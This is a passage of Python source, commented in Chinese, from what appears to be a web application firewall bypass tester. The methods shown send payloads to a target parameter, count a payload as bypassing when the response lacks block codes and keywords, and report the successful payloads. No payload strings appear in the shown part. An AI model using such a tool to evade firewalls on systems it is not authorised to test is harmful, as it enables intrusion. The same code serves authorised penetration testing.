    # ----------------------------------------------------------
    # 辅助方法
    # ----------------------------------------------------------

    def _test_bypass_payloads(self, payloads: Dict[BypassTechnique, List[str]], attack_type: str) -> List[BypassResult]:
        """测试绕过 payload"""
        results = []

        for technique, payload_list in payloads.items():
            for payload in payload_list:
                bypassed, status_code, resp_length = self._test_single_payload(payload)

                if bypassed:
                    logging.info(f"  [+] {attack_type} 绕过成功: {technique.value} - {payload[:50]}...")

                results.append(BypassResult(
                    technique=technique,
                    payload=payload,
                    bypassed=bypassed,
                    waf_vendor=self.waf_info.vendor,
                    bypass_status_code=status_code,
                    bypass_response_length=resp_length,
                ))

                time.sleep(self.config.delay)

        return results

    def _test_single_payload(self, payload: str) -> Tuple[bool, Optional[int], Optional[int]]:
        """测试单个 payload"""
        try:
            resp = self._send_request(payload)

            if resp is None:
                return False, None, None

            # 判断是否绕过
            # 条件1: 状态码不是 403/406/501/503
            # 条件2: 响应长度 > 500（排除空响应/错误页面）
            # 条件3: 响应中不包含 WAF 拦截特征
            blocked_codes = [403, 406, 501, 503]
            body_lower = resp.text.lower()
            block_indicators = ["access denied", "forbidden", "blocked", "rejected", "waf", "firewall"]

            is_blocked = (
                resp.status_code in blocked_codes or
                any(ind in body_lower for ind in block_indicators)
            )

            return not is_blocked, resp.status_code, len(resp.text)

        except requests.RequestException:
            return False, None, None

    def _send_request(self, payload: str) -> Optional[requests.Response]:
        """发送带 payload 的请求"""
        time.sleep(self.config.delay)
        try:
            if self.config.method.upper() == "GET":
                return self.session.get(
                    self.config.target_url,
                    params={self.config.parameter: payload},
                    timeout=self.config.timeout,
                )
            else:
                return self.session.post(
                    self.config.target_url,
                    data={self.config.parameter: payload},
                    timeout=self.config.timeout,
                )
        except requests.RequestException as e:
            logging.debug(f"Request failed: {e}")
            return None

    def print_results(self):
        """格式化输出结果"""
        if not self.results:
            print("\n[-] 无测试结果")
            return

        print(f"\n{'='*60}")
        print("  WAF 绕过测试报告")
        print(f"{'='*60}")

        # WAF 信息
        if self.waf_info.detected:
            print(f"\n  WAF 厂商: {self.waf_info.vendor.value}")
            print(f"  置信度: {self.waf_info.confidence:.1%}")
            if self.waf_info.signatures:
                print(f"  特征: {', '.join(self.waf_info.signatures[:3])}")

        # 绕过结果
        bypass_count = sum(1 for r in self.results if r.bypassed)
        print(f"\n  总测试: {len(self.results)} | 绕过成功: {bypass_count}")

        if bypass_count > 0:
            print(f"\n  {'='*40}")
            print("  成功绕过的 Payload:")
            print(f"  {'='*40}")
            for r in self.results:
                if r.bypassed:
                    print(f"\n  ✅ [{r.technique.value}] {r.payload[:80]}")
                    print(f"     状态码: {r.bypass_status_code} | 响应长度: {r.bypass_response_length}")

        print(f"\n{'='*60}")

    def export_json(self, filepath: str):
        """导出 JSON 报告"""
        import json
        data = {
            "waf_info": {
                "detected": self.waf_info.detected,
                "vendor": self.waf_info.vendor.value if self.waf_info.detected else None,
                "confidence": self.waf_info.confidence,
                "signatures": self.waf_info.signatures,
            },
            "total_tests": len(self.results),
            "bypass_count": sum(1 for r in self.results if r.bypassed),
            "results": [
                {
                    "technique": r.technique.value,
                    "payload": r.payload,
                    "bypassed": r.bypassed,
                    "status_code": r.bypass_status_code,
                    "response_length": r.bypass_response_length,
                    "notes": r.notes,
                }
                for r in self.results
            ],
        }
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        logging.info(f"[+] JSON 报告已导出: {filepath}")


